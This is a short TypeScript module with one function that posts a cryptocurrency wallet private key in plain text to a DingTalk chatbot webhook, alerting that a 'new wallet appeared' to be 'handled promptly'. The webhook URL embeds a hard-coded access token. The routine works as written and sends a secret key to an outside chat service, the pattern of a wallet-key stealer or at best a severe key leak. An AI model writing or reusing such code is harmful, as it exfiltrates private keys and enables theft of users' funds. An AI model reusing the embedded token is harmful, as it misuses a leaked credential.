import axios from "axios";


export const cex_newtoken_dingding_api = (provateKey: string) => {
    axios({
        url: `https://oapi.dingtalk.com/robot/send?access_token=5a3bff57a2d3f32bac3ef2fb930e894b5105554fcc6802a77c1f13299b413be2`,
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        data: {
            "msgtype": "text",
            "text": {
                "content": `新钱包出现，请及时处理\n${provateKey}`
            },
        }
    })
        .then(res => {
            if (res.data.errcode) console.log(res.data.errmsg);
        })
        .catch(err => {
            console.log(err)
        })
}